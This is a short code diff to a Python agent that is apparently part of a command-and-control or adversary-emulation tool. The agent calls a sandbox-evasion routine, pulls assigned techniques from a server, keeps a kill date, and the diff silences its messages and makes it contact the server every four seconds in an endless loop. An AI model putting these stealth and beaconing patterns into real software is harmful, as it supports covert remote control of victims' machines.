@@ -176,14 +176,14 @@ def send_output():
         print('[+] Failed to get techniques from the server')
         return
     if len(std_out) == 0:
-        print('[+] No techniques assigned')
+        # print('[+] No techniques assigned')
         return
 
     agent_tech = get_techniques()
     # http://localhost:8000/agent_techniques/5
 
     if agent_tech is None:
-        print('[+] Failed to get techniques from the server')
+        # print('[+] Failed to get techniques from the server')
         return
     if agent_tech == '':
         print('[+] No techniques assigned')
@@ -260,7 +260,6 @@ def sandbox_evasion():
 if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
-
     # Agent obtaining ID and kill date if any.
     if not os.path.exists(path=THIS_DIR / 'config.ini'):
         agent_id = randrange(500)
@@ -277,5 +276,7 @@ if __name__ == '__main__':
             kill_date_string = agent_config['AGENT']['kill_date']
         except KeyError:
             pass
-    send_output()
-    config_file()
+    while True:
+        time.sleep(4)
+        send_output()
+        config_file()
